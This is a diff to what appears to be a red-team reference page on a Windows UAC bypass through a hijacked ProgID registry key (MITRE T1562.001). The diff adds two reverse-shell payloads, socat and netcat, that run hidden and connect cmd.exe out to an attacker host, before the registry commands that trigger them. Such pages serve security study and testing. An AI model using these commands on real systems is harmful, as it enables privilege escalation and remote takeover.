@@ -2,7 +2,7 @@
 description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.001'
 ---
 
-# UAC bypass
+# UAC Bypass
 
 ## Theory
 
@@ -46,7 +46,10 @@ we will create an entry on the registry for a new progID of our choice (any name
 The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
 
 ```bash
+# Using socat
 $program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+# Or using netcat
+$program = "powershell -windowstyle hidden C:\Windows\Temp\nc64.exe 192.168.49.113 443 -e cmd.exe"
 
 New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
 Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
